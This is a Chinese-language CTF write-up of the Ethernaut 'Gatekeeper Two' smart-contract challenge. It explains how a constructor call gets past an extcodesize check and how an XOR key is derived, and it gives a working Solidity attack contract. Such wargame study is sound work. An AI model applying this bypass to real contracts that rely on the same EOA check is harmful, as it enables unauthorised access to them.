# Gatekeeper Two
Gatekeeper Two這一關需要我們成爲合約中的entrant，和Gatekeeper一樣，也是一個非常考驗綜合知識的一關，但會稍微簡單一點，讓我們看一下代碼。

## 合约代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
## 代碼分析
要成功通過這一關，我們也是需要通過三個modifier，分別是gateOne, gateTwo, gateThree。

### gateOne
gateOne的要求很簡單，需要msg.sender和tx.origin不同。這個我們在Gatekeeper One中也有相同的要求，這裏不再贅述。

### gateTwo
gateTwo涉及到assembly的知識。Solidity中定義了一種匯編語言Yul，可以和不同的Solidity共同使用，這裏不做詳細的介紹，有興趣的同學可以看[官方文檔](https://docs.soliditylang.org/en/v0.8.17/assembly.html?highlight=extcodesize#example)。這是一種内聯匯編語言，即可以直接嵌入Solidity的源碼使用。簡單來説語法就是使用`assembly{}`包裹起來。

`assembly`在我們的例子中定義了一個`x := extcodesize(caller())`。并且對`x`是否為0進行檢查。`extcodesize`是EVM中的一個操作碼，返回的地址的code size,或者跟具體的來説是runtime bytes。對於一個EOA來説，其code size為0，而對於合約而言，其code size不為0。所以這裏的檢查就是檢查msg.sender是否為合約地址。這裏就和gateOne相互產生矛盾了，因爲在gateOne中我們需要創建一個合約來調用enter函數來保證msg.sender和tx.origin不同。

但是這樣檢查EOA的方式是有漏洞的，因爲extcodesize并不會對creation bytes進行檢查，所以只要我們將我們的邏輯寫在合約的constructor中，即使是合約，extcodesize返回的值也是0。

### gateThree
gateThree要求`uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max`，其中`^`是Bitwise XOR(異或)運算符，假設`a = bytes8(keccak256(abi.encodePacked(msg.sender)))`, `b = gateKey`, `c = type(uint64).max`，那麽這個表達式可以簡化為 `a^b = c`，根據XOR運算規則，如果`a^b = c`,那麽`a^c = b`，所以我們可以通過`a^c`來獲取`b`，這裏的`a`是一個固定的值，`c`也是固定值，那麽我們就可以求出gateKey的值。


## 攻擊代碼
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);    
}

contract Attack {

    constructor(address _target) {
        IGatekeeperTwo target = IGatekeeperTwo(_target);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
        target.enter(key);
    }
}
```
## 攻擊過程
1. 部署攻擊合約，並且傳入GatekeeperTwo的地址，完成任務。


